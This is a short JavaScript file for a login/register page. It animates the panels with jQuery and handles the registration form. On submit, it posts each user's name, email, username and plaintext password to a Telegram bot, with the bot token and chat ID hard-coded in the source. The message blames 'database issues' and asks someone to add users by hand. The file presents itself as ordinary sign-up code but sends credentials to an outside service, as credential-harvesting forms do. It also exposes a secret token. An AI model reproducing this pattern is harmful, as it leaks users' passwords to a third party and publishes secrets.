$(document).ready(function () {
  $(".veen .rgstr-btn button").click(function () {
    $(".veen .wrapper").addClass("move");
    $(".body").css("background", "#e0b722");
    $(".veen .login-btn button").removeClass("active");
    $(this).addClass("active");
  });
  $(".veen .login-btn button").click(function () {
    $(".veen .wrapper").removeClass("move");
    $(".body").css("background", "#ff4931");
    $(".veen .rgstr-btn button").removeClass("active");
    $(this).addClass("active");
  });
});

//  ############################################
//  ##                                        ##
//  ##              Register form             ##
//  ##                                        ##
//  ############################################

let full_name = document.querySelector("#name");
let email = document.querySelector("#email");
let user_name = document.querySelector("#uid");
let submit_btn = document.querySelector(".dark");

document.getElementById("register").addEventListener("submit", function (e) {
  e.preventDefault();
  let TOKEN = "6669019283:AAHAaWZLL1T56kJ6CZHPjz3riUAwFOL8CI0";
  let URI_API = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
  let CHAT_ID = "-1001802004160";

  let message = `<b>Request from an application</b> \n`;
  message += `<b>Sender:</b> ${this.name.value} \n`;
  message += `<b>Mail:</b> ${this.email.value} \n`;
  message += `<b>UserName:</b> ${this.user_name.value} \n`;
  message += `<b>Password:</b> ${this.password.value} \n`;
  message += `<b>You are seing this because we have \n some issues with our database, which means that u \n should add users by ur self for some time</b>`;

  axios.post(URI_API, {
    chat_id: CHAT_ID,
    parse_mode: "html",
    text: message,
  });
});
